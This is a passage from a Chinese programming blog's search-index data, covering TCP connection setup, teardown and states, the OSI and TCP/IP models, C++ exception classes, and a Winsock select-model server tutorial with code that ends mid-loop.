现假定出现一种异常情况，即A发出的第一个连接请求报文段并没有丢失，而是在某些网络节点长时间滞留了，以致延误到连接释放以后的某个时间才到B。本来这是一个已失效的报文段。但是B收到此失效的连接请求报文段后，就误认为是A有发出一次新的连接请求。于是就向A发出确认报文段，同意建立连接。假定不采用三次握手，那么只要B发出确认，新的连接就建立了。 由于现在A并没有发出建立连接的请求，因此不会理睬B的确认，也不会向B发送数据。但B却以为新的运输连接已经建立了，并一直等待A发来数据。B的许多资源就这样拜拜浪费了。 采用三次握手的办法可以防止上述现象的发生。例如在刚才的情况下，A不会向B的确认发出确认。B由于收不到确认，就知道A并没有要求建立连接。 另一种解释： 这个问题的本质是, 信道不可靠, 但是通信双发需要就某个问题达成一致. 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足&quot;在不可靠信道上可靠地传输信息&quot;这一需求所导致的. 请注意这里的本质需求,信道不可靠, 数据传输要可靠. 三次达到了, 那后面你想接着握手也好, 发数据也好, 跟进行可靠信息传输的需求就没关系了. 因此,如果信道是可靠的, 即无论什么时候发出消息, 对方一定能收到, 或者你不关心是否要保证对方收到你的消息, 那就能像UDP那样直接发送消息就可以了”。这可视为对“三次握手”目的的另一种解答思路。 四次挥手关闭连接 当客户A 没有东西要发送时就要释放 A 这边的连接，A会发送一个报文（没有数据），其中 FIN 设置为1, 服务器B收到后会给应用程序一个信，这时A那边的连接已经关闭，即A不再发送信息（但仍可接收信息）。 A收到B的确认后进入等待状态，等待B请求释放连接， B数据发送完成后就向A请求连接释放，也是用FIN=1 表示， 并且用 ack = u+1(如图）， A收到后回复一个确认信息，并进入 TIME_WAIT 状态， 等待 2MSL 时间。 l 为什么要等待呢？ l 为了防止这种情况：A接到B的释放连接请求后会发送一个确认信息，但是如果这个确认信息丢了，也就是B没有收到确认释放连接，那么B就会重发一个释放连接请求，这时候A还处于TIME_WAIT状态，所以会再次发送一个确认信息。 l Q2为什么TIME_WAIT 状态还需要等2*MSL秒之后才能返回到CLOSED 状态呢？ l A2因为虽然双方都同意关闭连接了，而且握手的4个报文也都发送完毕，按理可以直接回到CLOSED 状态（就好比从SYN_SENT 状态到ESTABLISH 状态那样），但是我们必须假想网络是不可靠的，你无法保证你最后发送的ACK报文一定会被对方收到，就是说对方处于LAST_ACK 状态下的SOCKET可能会因为超时未收到ACK报文，而重发FIN报文，所以这个TIME_WAIT 状态的作用就是用来重发可能丢失的ACK报文。 11种状态 简单解释： l CLOSED：初始状态，表示TCP连接是“关闭着的”或“未打开的”。 l LISTEN ：表示服务器端的某个SOCKET处于监听状态，可以接受客户端的连接。 l SYN_RCVD ：表示服务器接收到了来自客户端请求连接的SYN报文。在正常情况下，这个状态是服务器端的SOCKET在建立TCP连接时的三次握手会话过程中的一个中间状态，很短暂，基本上用netstat很难看到这种状态，除非故意写一个监测程序，将三次TCP握手过程中最后一个ACK报文不予发送。当TCP连接处于此状态时，再收到客户端的ACK报文，它就会进入到ESTABLISHED 状态。 l SYN_SENT ：这个状态与SYN_RCVD 状态相呼应，当客户端SOCKET执行connect()进行连接时，它首先发送SYN报文，然后随即进入到SYN_SENT 状态，并等待服务端的发送三次握手中的第2个报文。SYN_SENT 状态表示客户端已发送SYN报文。 l ESTABLISHED ：表示TCP连接已经成功建立。 l FIN_WAIT_1 ：这个状态得好好解释一下，其实FIN_WAIT_1 和FIN_WAIT_2 两种状态的真正含义都是表示等待对方的FIN报文。而这两种状态的区别是：FIN_WAIT_1状态实际上是当SOCKET在ESTABLISHED状态时，它想主动关闭连接，向对方发送了FIN报文，此时该SOCKET进入到FIN_WAIT_1 状态。而当对方回应ACK报文后，则进入到FIN_WAIT_2 状态。当然在实际的正常情况下，无论对方处于任何种情况下，都应该马上回应ACK报文，所以FIN_WAIT_1 状态一般是比较难见到的，而FIN_WAIT_2 状态有时仍可以用netstat看到。 l FIN_WAIT_2 ：上面已经解释了这种状态的由来，实际上FIN_WAIT_2状态下的SOCKET表示半连接，即有一方调用close()主动要求关闭连接。注意：FIN_WAIT_2 是没有超时的（不像TIME_WAIT 状态），这种状态下如果对方不关闭（不配合完成4次挥手过程），那这个 FIN_WAIT_2 状态将一直保持到系统重启，越来越多的FIN_WAIT_2 状态会导致内核crash。 l TIME_WAIT ：表示收到了对方的FIN报文，并发送出了ACK报文。 TIME_WAIT状态下的TCP连接会等待2*MSL（Max Segment Lifetime，最大分段生存期，指一个TCP报文在Internet上的最长生存时间。每个具体的TCP协议实现都必须选择一个确定的MSL值，RFC 1122建议是2分钟，但BSD传统实现采用了30秒，Linux可以cat /proc/sys/net/ipv4/tcp_fin_timeout看到本机的这个值），然后即可回到CLOSED 可用状态了。如果FIN_WAIT_1状态下，收到了对方同时带FIN标志和ACK标志的报文时，可以直接进入到TIME_WAIT状态，而无须经过FIN_WAIT_2状态。（这种情况应该就是四次挥手变成三次挥手的那种情况） l CLOSING ：这种状态在实际情况中应该很少见，属于一种比较罕见的例外状态。正常情况下，当一方发送FIN报文后，按理来说是应该先收到（或同时收到）对方的ACK报文，再收到对方的FIN报文。但是CLOSING 状态表示一方发送FIN报文后，并没有收到对方的ACK报文，反而却也收到了对方的FIN报文。什么情况下会出现此种情况呢？那就是当双方几乎在同时close()一个SOCKET的话，就出现了双方同时发送FIN报文的情况，这是就会出现CLOSING 状态，表示双方都正在关闭SOCKET连接。 l CLOSE_WAIT ：表示正在等待关闭。怎么理解呢？当对方close()一个SOCKET后发送FIN报文给自己，你的系统毫无疑问地将会回应一个ACK报文给对方，此时TCP连接则进入到CLOSE_WAIT状态。接下来呢，你需要检查自己是否还有数据要发送给对方，如果没有的话，那你也就可以close()这个SOCKET并发送FIN报文给对方，即关闭自己到对方这个方向的连接。有数据的话则看程序的策略，继续发送或丢弃。简单地说，当你处于CLOSE_WAIT 状态下，需要完成的事情是等待你去关闭连接。 l LAST_ACK ：当被动关闭的一方在发送FIN报文后，等待对方的ACK报文的时候，就处于LAST_ACK 状态。当收到对方的ACK报文后，也就可以进入到CLOSED 可用状态了。 CLOSING状态：","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"TCP/IP协议模型","slug":"jiw003-TCP-IP协议","date":"2021-06-22T20:51:49.000Z","updated":"2021-06-22T21:52:06.864Z","comments":true,"path":"2021/06/23/jiw003-TCP-IP协议/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw003-TCP-IP协议/","excerpt":"","text":"TCP/IP协议模型 tcp/ip协议5层 物理层 数据链接层 网络层 传输层 应用层 数据封装和解封装过程","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"jiw002-OSI的七层模型","slug":"jiw002-OSI的七层模型","date":"2021-06-22T20:41:52.000Z","updated":"2021-06-22T20:50:39.089Z","comments":true,"path":"2021/06/23/jiw002-OSI的七层模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw002-OSI的七层模型/","excerpt":"","text":"网络工程师： 物理层 1层，通信介质的信号到数字信号（二进制0101） 负责从电信号/光信号/电磁波信号转换到数字信号 或 从数字信号转换到电信号/光信号/电磁波信号 数据链接层 2层 局域网之间计算机通信 通过mac地址通信 arp协议 网络层 3层 IP地址，路由（通过网络访问全世界） 公网的ip地址相当于门牌号（全世界网络互连） ： 私网的ip地址相当于房间号（局域网内部网络互连） 传输层 4层 tcp/udp tcp（可靠，速度慢） udp （不可靠，速度快） 端口（让不同的应用程序，同时使用网络） 开发： 会话层 5层 控制发包的数据 会话层控制传输层，建立三次握手 表示层 6层 文件格式 应用层 7层应用程序使用","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"网络的重要性和局域网简介","slug":"jiw001-网络的重要性和局域网简介","date":"2021-06-22T20:34:11.000Z","updated":"2021-06-22T20:41:07.830Z","comments":true,"path":"2021/06/23/jiw001-网络的重要性和局域网简介/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/jiw001-网络的重要性和局域网简介/","excerpt":"","text":"网络的重要性和局域网简介 网络的重要性：所有的操作系统都有网络！ 教室这么多的电脑如何上网的？ 网卡（mac地址）可以通过MAX地址查询网卡生产厂商 有线（双绞线传播电信号）双向，同时收发 无线（无线电波）发的时候，不能收 交换（扩充网线插槽，让更多的人，在同一个局域网共享上网） 傻瓜交换机（tplink/dlink/水星…） 程控交换机（配置管理，可控思科、华为、华三） 路由（双网卡） 内网卡…-交换机 192.168.16.0/24（192.168.16.1-192.168.16.254） 外网卡 运营商 122.71.64.2（铁通） 查公网ip的方法： windows，打开浏览器，访问百度，搜IP即可 Linux：curl ifconfig.me 扩展：高级路由器还有上网行为管理器和防火墙功能哦 10Mbps==1.25MB 1.1M 100Mbps == 12MR 300KB/s 500KB/s 论坛：鸿鹄论坛（网络工程师） CCNA入门 CCNP广度 CCIE深度 HCIA HCIP HCIE","categories":[{"name":"计算机网络TCP/IP传输协议/网络抓包","slug":"计算机网络TCP-IP传输协议-网络抓包","permalink":"https://xiaowuyoucy.github.io/categories/计算机网络TCP-IP传输协议-网络抓包/"}],"tags":[]},{"title":"标准程序库异常和继承标准程序异常库","slug":"cpp0074-标准程序库异常","date":"2021-06-22T19:38:36.000Z","updated":"2021-12-28T18:39:23.810Z","comments":true,"path":"2021/06/23/cpp0074-标准程序库异常/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/23/cpp0074-标准程序库异常/","excerpt":"","text":"标准程序库异常 标准异常类的成员： 在上述继承体系中，每个类都有提供了构造函数、复制构造函数、和赋值操作符重载。 logic_error类及其子类、runtime_error类及其子类，它们的构造函数是接受一个string类型的形式参数，用于异常信息的描述； 所有的异常类都有一个what()方法，返回const char* 类型（C风格字 符串）的值，描述异常信息。 123456789101112131415161718192021222324252627#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;stdexcept&gt;using namespace std;double mydiv(int x, int y) &#123; if (y == 0) &#123; throw out_of_range(\"除数不能为0\"); &#125; return x / y;&#125;int main(char *argv[], int argc)&#123; try &#123; mydiv(100,0); &#125; catch (out_of_range&amp; oor) &#123; cout &lt;&lt; oor.what() &lt;&lt; endl; &#125; return 0;&#125; 继承标准程序异常基类 继承异常基类需要重写virtual char const* what() const成员函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;exception&gt;using namespace std;class MyException :public exception &#123;public: MyException(const char * error) &#123; pError = new char[strlen(error) + 1]; strcpy(pError,error); &#125; virtual char const* what() const &#123; return pError; &#125; ~MyException() &#123; if (pError != NULL) &#123; delete[] pError; pError = NULL; &#125; &#125;private: char *pError;&#125;;double div(double x,double y) &#123; if (y == 0.0) &#123; throw MyException(\"除数不能为0\"); &#125; return x / y;&#125;int main(char *argv[], int argc)&#123; try &#123; div(100.0,0.0); &#125; catch (exception&amp; oor) &#123; cout &lt;&lt; oor.what() &lt;&lt; endl; &#125; return 0;&#125;","categories":[{"name":"cpp","slug":"cpp","permalink":"https://xiaowuyoucy.github.io/categories/cpp/"}],"tags":[]},{"title":"select模型","slug":"WS003select模型","date":"2021-06-21T14:48:18.000Z","updated":"2021-06-21T01:36:04.386Z","comments":true,"path":"2021/06/21/WS003select模型/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/21/WS003select模型/","excerpt":"","text":"select模型 特点 1、解决基本c/s模型中，accept rcev 傻等的问题 傻等阻塞 执行阻塞 send recv accept 在执行的复制黏贴的过程中都是阻塞的 所以注意，select没模型是解决傻等的问题的，不解决这几个函数本身的阻塞问题，这几个函数本身阻塞的问题，我们接下来的模型会慢慢深入讲解，有五种模型呢~ 2、实现多个客户端链接，与多个客户端分别通信 3、用于服务器，客户端就不用这个了，因为只有一个socket 客户端recv等时候，也不能send啊？ 只需要单独创建一根线程，recv放线程里，就完事儿~ 服务端 网络头文件 网络库 最底层的网络函数，大家用QT MFC wpf，或者百度下载的很多其他的封装好的网络库，都是对咱们讲的这些最本质的网络函数的二次封装，咱们讲的是通用的，讲完这个大家也可以自己封装函数库给别人用了。 #include &lt;WinSock2.h&gt; #pragma comment(lib,“ws2_32.lib”) 函数库 winsock2.h windows socket 第2版 第一版是 winsock.h 查看具体区别 目前网络库有哪些版本？ 1.0 1.1 2.0 2.1 2.2 演示MSDN 查这个函数的详细信息 WSAStartup 我们的开发环境支持哪个版本？ 打开头文件，看咱们当前编译器环境支持的最高版本 ws2_32.lib windows socket 第2版 32位 不管是64编译环境还是32编译环境，都是用这个，并没有ws2_64.dll wsock32.lib winsock.h 第一版网络库 对应的库文件 这里不区分大小写 打开网络库 int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); 功能 打开网络库/启动网络库，启动了这个库，这个库里的函数/功能才能使用 w windows s socket a Asynchronous 异步 startup 启动 同步与异步 同步 阻塞/卡死状态 异步 多个工作同时进行 参数1 我们要使用的库的版本 类型是 WORD 转定义：unsigned short WORD wVersionRequired = MAKEWORD(2,2); MAKEWORD(主版本,副版本)， 1.0 2.2 wVersionRequired 数据高位/高地址是副版本 数据低位/低地址是主版本 用调试+计算器演示数据原理 位运算，内存操作，小端存储 参数2 LPWSADATA lpWSAData 系统通过这个参数给我们一些配置信息 注意 当看到参数有 LP P前缀的时候，是说我们这里要传对应类型变量的地址，这是win32API 的规范 或者叫规则 看下有哪些信息 struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN + 1]; char szSystemStatus[WSASYS_STATUS_LEN + 1]; } wVersion 我们要使用的版本 wHighVersion 系统能提供给我们最高的版本 iMaxSockets 返回可用的socket的数量，2版本之后就没用了 iMaxUdpDg UDP数据报信息的大小，2版本之后就没用了 lpVendorInfo 供应商特定的信息，2版本之后就没用了 szDescription szSystemStatus 当前库的描述信息，2.0是第二版的意思 当输入的版本不存在 输入1.3， 2.3 有主版本，没有副版本 得到该主版本的最大副版本 1.1 2.2并使用 输入3.1 3.3 超过最大版本号 使用系统能提供的最大的版本 2.2 输入 0.0 0.1 0.3 主版本是0 网络库打开失败，不支持请求的套接字版本 返回值 返回0为执行正确 失败 这些宏的本质 WSASYSNOTREADY 10091 底层网络子系统尚未准备好进行网络通信。 系统配置问题，重启下电脑，检查ws2_32库是否存在，或者是否在环境配置目录下 WSAVERNOTSUPPORTED 10092 此特定Windows套接字实现不提供所请求的Windows套接字支持的版本。 要使用的版本不支持 WSAEPROCLIM 10067 已达到对Windows套接字实现支持的任务数量的限制。 Windows Sockets实现可能限制同时使用它的应用程序的数量 WSAEINPROGRESS 10036 正在阻止Windows Sockets 1.1操作。 当前函数运行期间，由于某些原因造成阻塞，会返回在这个错误码，其他操作均禁止 WSAEFAULT 10014 lpWSAData参数不是有效指针。 参数写错了 校验版本 2 != HIBYTE(wsaData.wVersion) || 2 != LOBYTE(wsaData.wVersion) HIBYTE是高位 副版本 LOBYTE是地位 主版本 逻辑 只要有一个不是2，说明系统不支持我们要的2.2版本 关闭库 并结束函数，可以给出相应提示 WSACleanup(); return 0； 创建SOCKET SOCKET socket( int af, int type, int protocol ); 作用 创建一个SOCKET SOCKET介绍 什么是socket 将底层复杂的协议体系，执行流程，进行了封装，封装完的结果，就是一个SOCKET了， 也就是说，SOCKET是我们调用协议进行通信的 操作接口 意义 将复杂的协议过程与我们编程人员分开，我们直接操作一个简单SOCKET就行了，对于底层的协议 过程细节，完全不用知道，这就大大方便了我们。 网络编程难就难在协议本身的复杂性，简单就简单在我们编程层面完全不用考虑哪些 本质 就是一种数据类型，转定义看下类型 就是一个整数 uint 但是这个数是唯一的 标识着我当前的应用程序，协议特点等信息 ID，门牌号 应用 我们网络通信的函数，全部都要使用SOCKET 演示 逻辑 每个客户端有一个SOCKET，服务器有一个SOCKET，通信时候，就需要这个SOCKET做参数，给谁通信，就要传递谁的SOCKET 所以 网络编程，理论层面SOCKET是网络封装的精华，代码层面就是不停的使用SOCKET这个变量，所以又叫SOCKET编程 参数1 地址的类型 比如大家联系我 手机 15512345678 固定电话 7881234 ＱＱ 40916626 微信 c3_xin666 找上门 内蒙古 xxxxxxx … AF_INET 2 ipv4 Internet协议版本4（IPv4）地址系列。 192.168.1.103 0.0.0.0 ~ 255.255.255.255 点分十进制表示法 4字节 32位的地址 个数快不够 就是无符号int类型的范围 0 ~ 4294967295 AF_INET6 23 ipv6 Internet协议版本6（IPv6）地址系列。 2001:0:3238:DFE1:63::FEFB 16字节 128位的地址 这个地球每寸一个IP AF_BTH 32 蓝牙地址系列。 如果计算机安装了蓝牙适配器和驱动程序，则Windows XP SP2或更高版本支持此地址系列。 6B:2D:BC:A9:8C:12 AF_IRDA 26 红外数据协会（IrDA）地址系列。 仅当计算机安装了红外端口和驱动程序时，才支持此地址系列。 通信地址不仅仅只有IP地址 参数2 套接字类型 SOCK_STREAM 1 一种套接字类型，提供带有OOB数据传输机制的顺序，可靠，双向，基于连接的字节流。 此套接字类型使用传输控制协议（TCP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_DGRAM 2 一种支持数据报的套接字类型，它是固定（通常很小）最大长度的无连接，不可靠的缓冲区。 此套接字类型使用用户数据报协议（UDP）作为Internet地址系列（AF_INET或AF_INET6）。 SOCK_RAW 3 一种套接字类型，提供允许应用程序操作下一个上层协议头的原始套接字。 要操作IPv4标头，必须在套接字上设置IP_HDRINCL套接字选项。 要操作IPv6标头，必须在套接字上设置IPV6_HDRINCL套接字选项。 SOCK_RDM 4 一种套接字类型，提供可靠的消息数据报。 这种类型的一个示例是Windows中的实用通用多播（PGM）多播协议实现，通常称为可靠多播节目。 仅在安装了可靠多播协议时才支持此类型值。 SOCK_SEQPACKET 5 一种套接字类型，提供基于数据报的伪流数据包。 参数3 协议的类型 IPPROTO_TCP 传输控制协议（TCP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_STREAM时，这是一个可能的值。 IPPROTO_UDP 用户数据报协议（UDP）。 当af参数为AF_INET或AF_INET6且类型参数为SOCK_DGRAM时，这是一个可能的值。 IPPROTO_ICMP Internet控制消息协议（ICMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_IGMP Internet组管理协议（IGMP）。 当af参数为AF_UNSPEC，AF_INET或AF_INET6且类型参数为SOCK_RAW或未指定时，这是一个可能的值。 IPPROTO_RM 用于可靠多播的PGM协议。 当af参数为AF_INET且类型参数为SOCK_RDM时，这是一个可能的值。 在针对Windows Vista及更高版本发布的Windows SDK上，此协议也称为IPPROTO_PGM。 仅在安装了可靠多播协议时才支持此协议值。 整理下 通过参数3得到一个事儿，参数1 2 3三者是配套的，是一套参数，不是随便填的，即使用不同的协议，那要添加对应的那套参数。 想要使用一个协议，咱们设备得支持才行，比如红外 参数3中，有个可能这个词，所以说一般，参数3可以填写0，系统会自动帮我们选择协议类型 返回值 成功返回可用的socket 不用了就一定要销毁套接字 closesocket(socketListen); 失败返回INVALID_SOCKET 关闭网络库 WSACleanup(); 可用WSAGetLasterror()返回错误码 绑定地址与端口 int bind( SOCKET s, const sockaddr *addr, int namelen ); 作用 给我们的socket绑定端口号与具体地址 地址 找到咱们的电脑 只有一个 端口号 找到我们机器上对应的软件，比如QQ，浏览器等等，都对应着自己的端口号 多个 每一种通信的端口号是唯一的 同一个软件可能占用多个端口号 参数1 上一个函数创建了socket，绑定了协议信息（地址类型，套接字类型，协议类型），咱们bind函数就是绑定实质的地址，端口号 参数2 结构体 地址类型 装IP地址 端口号 结构体类型 sockaddr 该参数使用方法 SOCKADDR_IN sockAddress; sockAddress.sin_family = AF_INET; sockAddress.sin_addr.s_addr = inet_addr(“127.0.0.1”); sockAddress.sin_port = 12345; (sockaddr*)&amp;sockAddress强转添加到参数2上 成员1 跟socket函数参数1是一样的 成员2 IP地址 192.168.xxx.xxx 可以在控制台输入指令 ipconfig 就能看到了 或者在网络设置中，能找到这个地址 我就不演示了，我不想让你们发现我 127.0.0.1 回送地址 本地回环地址 本地网络测试 参数3 端口号 本质 就是一个整数 0~65535 IP是我们机器的地址，端口就是我们具体的软件的通信口，一个软件可能会占用多个接口，比如一个软件可以聊天，可以下载，可以看视频…那么这些不同的通信内容，往往会有各自的协议，各自的端口。 IP是公司地址，端口就是各个部门的地址了 填写哪个值呢？ 理论上只要这个范围0~65535都可以 实际 介于0～1023，为系统保留占用端口号 21端口分配给FTP(文件传输协议)服务 25端口分配给SMTP（简单邮件传输协议）服务 80端口分配给HTTP服务 所以 我们不能写这个范围的 我们的范围就是1024~65535 稍微大点儿，1万多 但是注意一点，端口号是唯一的，比如1234已经被别的软件占用了，那么你再使用1234这个端口号，那么就会绑定失败，因为已经呗占用了 给大家演示下 那大家如何查看自己要用的端口号有没有被占用呢？ 打开运行cmd输入netstat -ano 查看被使用的所有端口 netstat -aon|findstr “12345” 检查我们要使用的端口号是否被使用了 使用了就会显示使用的程序，未被使用就啥都不显示 参数3 参数2的类型大小 sizeof(参数2) 返回值 成功返回0 失败返回SOCKET_ERROR 具体错误码通过int WSAGetLastError(void);获得 closesocket(socketListen); WSACleanup(); 开始监听 int WSAAPI listen( SOCKET s, int backlog ); 作用 将套接字置于正在侦听传入连接的状态。 参数1 服务器端的socket，也就是socket函数创建的 参数2 挂起连接队列的最大长度。 就是说，比如有100个用户链接请求，但是系统一次只能处理20个，那么剩下的80个不能不理人家，所以系统就创建个队列记录这些暂时不能处理，一会儿处理的链接请求，依先后顺序处理，那这个队列到底多大？就是这个参数设置，比如2，那么就允许两个新链接排队的。这个肯定不能无限大，那内存不够了。 我们可以手动设置这个参数，但是别大了。可能210多，20多。 我们一般填写这个参数 SOMAXCONN 作用是让系统自动选择最合适的个数 不同的系统环境不一样，所以这个合适的数也都不一样 WSAAPI 调用约定 这个我们可以忽略，这是给系统看的，跟咱们没关 决定三 函数名字的编译方式 参数的入栈顺序 函数的调用时间 返回值 成功 返回0 失败 SOCKET_ERROR 具体错误码 WSAGetLastError() 释放 closesocket(socketListen); WSACleanup(); select 逻辑 1、每个客户端都有socket，服务器也有自己的socket，将所有的socket装进一个数据结构里，即数组 两种 2、通过select函数，遍历1中的socket数组，当某个socket有响应，select就会通过其参数/返回值反馈出来。 我们就做相应处理 3、我们就做相应处理 如果检测到的是服务器socket 那就是有客户端链接 调用accept 如果检测到的是客户端socket 那就是客户端请求通信 send或者recv 第一步 定义一个装客户端socket结构 fd_set clientSet; fd_set网络定义好的专门给咱们用的 转定义看下fd_set的声明 64 默认FD_SETSIZE是64, 大家可以在Winsock2.h前声明这个宏，给他更大的值，他就更大了，不要过大 因为原理就是不听的遍历检测，越多肯定效率越低，延迟越大，所以大家尽量不要太大，几百个，1024就差不多了，当然大家不怕慢，可以设置更多~ 所以，select模型应用，就是小用户量访问量，几十几百，简单方便。 四个操作fd_set的参数宏 依次转定义看下逻辑 FD_ZERO 讲集合清0 FD_ZERO(&amp;clientSet); FD_SET 向集合中添加一个socket 当数量不足64，并且不存在的时候 FD_SET(socket, &amp;setRead); FD_CLR 结合中删除指定socket FD_CLR(socket, &amp;setRead); 我们要手动释放 FD_ISSET 判断一个socket是否在集合中 不在返回0 在返回非0 FD_ISSET(socket, &amp;setRead) 第二步 select 作用 监视socket集合，如果某个socket发生事件（链接或者收发数据），通过返回值以及参数告诉我们 函数原型 int WSAAPI select ( int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const timeval *timeout ); 参数1 忽略 填0 这个参数仅仅是为了兼容Berkeley sockets. 参数2 检查是否有可读的socket 即客户端发来消息了，该socket就会被设置 &amp;setRead 初始化为所有的socket，通过select投放给系统，系统将有事件发生的socket再赋值回来，调用后，这个参数就只剩下有请求的socket 参数3 检查是否有可写的socket 就是可以给哪些客户端套接字发消息，即send 只要链接成功建立起来了，那该客户端套接字就是可写的 &amp;setWrite 初始化为所有的socket，通过select投放给系统，系统将可写的socket再赋值回来，调用后，这个参数就是装着可以被send数据的客户端socket 一般我们就直接send了，所以这个参数逻辑上，用的不是非常多 参数4 检查套接字上的异常错误 用法跟2 3一样 将有异常错误的套接字重新装进来，，反馈给我们 得到异常套接字上的具体错误码 getsockopt （socket，SOL_SOCKET， SO_ERROR, buf , buflen） 错误信息通过参数4返给我们 参数5 最大等待时间 比如当客户端没有请求时，那么select函数可以等一会儿，一段时间过后，还没有，就继续执行select下面的语句，如果有了，就立刻执行下面的语句 TIMEVAL 两个成员 tv_sec 秒 tv_usec 微秒 0 0 非阻塞状态，立刻返回 3 4 那就再无客户端响应的情况下等待3秒4微秒 NULL select完全阻塞 直到客户端有反应，我才继续 返回值 0 客户端在等待时间内没有反应 处理 continue就行了 0 有客户端请求交流了 SOCKET_ERROR 发生了错误 得到错误码WSAGetLastError() 第四步 0处理 客户端socket有事件 可读的 遍历响应socket集合 如果是socketServer accept 客户端socket recv 0 客户端正常下线 要在socket集合中删除对应的客户端socket 0 客户端发来了消息，buf中 socket_error 客户端有错误发生 可写的 调用send 成功返回发送的字节数 失败返回socket_error WSAGetLastError的到错误码 有异常的 getsockopt （socket，SOL_SOCKET， SO_ERROR, buf , buflen） 作用 将socket上产生的异常，通过参数4返回给咱们 返回值 成功返回0 失败返回sock_error WSAGetLastError得到错误码 总结 代码结构 select模型的代码，也会有细节优化的，结构稍有变化的，但是原理都一样，咱们讲的就是最笨，思路最简单的方法，让大家理解这个模型的处理本质 结构核心 参数2 处理accept与recv傻等的问题 这是select结构对比基本模型的最大的作用 所以大家看网上的一些代码，基本都是只有参数2，参数3，4都是NULL 参数3 send随时都能发，并不一定由参数3决定send 流程总结 socket集合 select判断有没有响应的 返回0：没有，继续挑 返回&gt;0：有响应的 可读的 accept recv 可写的 send 不是非得从此处调用send 异常的 getsockopt sock_error select是阻塞的 不等待 执行阻塞 半等待 执行阻塞+软阻塞 全等待 执行阻塞+硬阻塞 死等 释放socket 释放所有socket 控制台点x退出 主函数投递一个监视 SetConsoleCtrlHandler(HandlerRoutine, FALSE); 处理函数 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType ) { switch (dwCtrlType) { case CTRL_CLOSE_EVENT: { 释放socket; } } return TRUE; } 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196// select.cpp : 定义控制台应用程序的入口点。//#include \"stdafx.h\"#include&lt;iostream&gt;#define FD_SETSIZE 1024#include&lt;WinSock2.h&gt;#include&lt;windows.h&gt;#pragma comment(lib,\"ws2_32.lib\")using namespace std;SOCKET serverSocket;fd_set allSocket;BOOL WINAPI ExitFun(DWORD dwCtrlType) &#123; switch (dwCtrlType) &#123; case CTRL_CLOSE_EVENT: FD_CLR(serverSocket, &amp;allSocket); for (u_int i = 0; i &lt; allSocket.fd_count; i++) &#123; closesocket(allSocket.fd_array[i]); &#125; FD_ZERO(&amp;allSocket); closesocket(serverSocket); WSACleanup(); break; &#125; return TRUE;&#125;int main(int argc, char *argv[])&#123; SetConsoleCtrlHandler(ExitFun, TRUE); WORD wdVersion = MAKEWORD(2, 2); WSADATA wdSockMsg; int nRes = WSAStartup(wdVersion, &amp;wdSockMsg); if (0 != nRes) &#123; cout &lt;&lt; \"WSAStartup Error\" &lt;&lt; endl; return 0; &#125; if (HIBYTE(wdSockMsg.wVersion) != 2 || LOBYTE(wdSockMsg.wVersion) != 2) &#123; WSACleanup(); cout &lt;&lt; \"网络库版本出错\" &lt;&lt; endl; return 0; &#125; serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); if (serverSocket == INVALID_SOCKET) &#123; cout &lt;&lt; \"socket Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; WSACleanup(); return 0; &#125; sockaddr_in si; si.sin_family = AF_INET; si.sin_port = htons(12346); si.sin_addr.S_un.S_addr = inet_addr(\"192.168.1.103\"); if (SOCKET_ERROR == bind(serverSocket, (sockaddr *)&amp;si, sizeof(si))) &#123; cout &lt;&lt; \"bind Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; closesocket(serverSocket); WSACleanup(); return 0; &#125; if (SOCKET_ERROR == listen(serverSocket,SOMAXCONN)) &#123; cout &lt;&lt; \"listen Error: \" &lt;&lt; WSAGetLastError() &lt;&lt; endl; closesocket(serverSocket); WSACleanup(); return 0; &#125; //初始化allSocket变量 FD_ZERO(&amp;allSocket); //将服务器套接字添加到allSocket中 FD_SET(serverSocket,&amp;allSocket); while (true) &#123; //设置等待时间 TIMEVAL waitTime; waitTime.tv_sec = 3; waitTime.tv_usec = 0; //使用临时的fd_set变量,防止被覆盖掉 fd_set readAllSocket = allSocket; fd_set writeAllSocket = allSocket; fd_set exAllSocket = allSocket; //进入select,将有消息的套接字选出来 int nStRes = select(0, &amp;readAllSocket, &amp;writeAllSocket, &amp;exAllSocket, &amp;waitTime); //没有消息 if (nStRes == 0) &#123; continue; &#125; //有消息 else if (nStRes &gt; 0) &#123; //处理有请求的套接字 for (u_int i = 0; i &lt; readAllSocket.fd_count; i++) &#123; //如果是服务器套接字,说明有accept请求 